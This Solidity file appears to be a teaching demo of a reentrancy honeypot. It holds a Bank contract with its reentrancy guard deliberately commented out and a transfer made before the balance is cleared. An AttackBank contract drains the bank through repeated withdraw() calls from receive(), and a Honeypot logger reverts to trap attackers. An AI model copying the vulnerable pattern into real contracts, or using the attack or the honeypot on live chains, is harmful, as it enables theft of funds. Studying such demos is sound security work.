// SPDX-License-Identifier: MIT

pragma solidity ^0.8.30;

interface ILogger {
    event Log(address _caller, uint _amount, uint _actionCode);

    function log(address _caller, uint _amount, uint _actionCode) external;
}

contract Logger is ILogger {
    function log(address _caller, uint _amount, uint _actionCode) public {
        emit Log(_caller, _amount, _actionCode);
    }
}

contract Honeypot is ILogger {
    function log(address, uint, uint _actionCode) public pure {
        if (_actionCode == 2) {
            revert('Hahahahoneypot!');
        }
    }
}

contract Bank {
    mapping(address => uint) public balances;
    uint constant MIN_DEPOSIT_VALUE = 1 ether;
    Logger logger;
    bool resuming;

    // bool locked;

    // modifier noReentrancy() {
    //     require(!locked, 'No reentrancy!');
    //     locked = true;
    //     _;
    //     locked = false;
    // }

    constructor(Logger _logger) {
        logger = _logger;
    }

    function deposit() external payable {
        require(msg.value >= MIN_DEPOSIT_VALUE, 'Minimum deposit is 1 ether');
        balances[msg.sender] = msg.value;
        logger.log(msg.sender, msg.value, 0);
    }

    // function withdraw() external noReentrancy {
    //     _withdraw(msg.sender);
    // }

    function withdraw() external {
        if (resuming == true) {
            _withdraw(msg.sender, 2);
        } else {
            resuming = true;
            _withdraw(msg.sender, 1);
        }
    }

    function _withdraw(address _initiator, uint _statusCode) internal {
        (bool success, bytes memory data) = msg.sender.call{
            value: balances[_initiator]
        }('');

        if (!success) {
            if (data.length == 0) {
                revert('Failed to withdraw!');
            } else {
                assembly {
                    revert(add(32, data), mload(data))
                }
            }
        }

        require(success, 'Failed to withdraw!');

        balances[_initiator] = 0;

        logger.log(msg.sender, msg.value, _statusCode);

        resuming = false;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract AttackBank {
    Bank bank;
    uint constant MIN_DEPOSIT_VALUE = 1 ether;

    constructor(Bank _bank) {
        bank = _bank;
    }

    function attack() public payable {
        require(msg.value >= MIN_DEPOSIT_VALUE, 'Minimum deposit is 1 ether');
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (bank.getBalance() >= MIN_DEPOSIT_VALUE) {
            bank.withdraw();
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
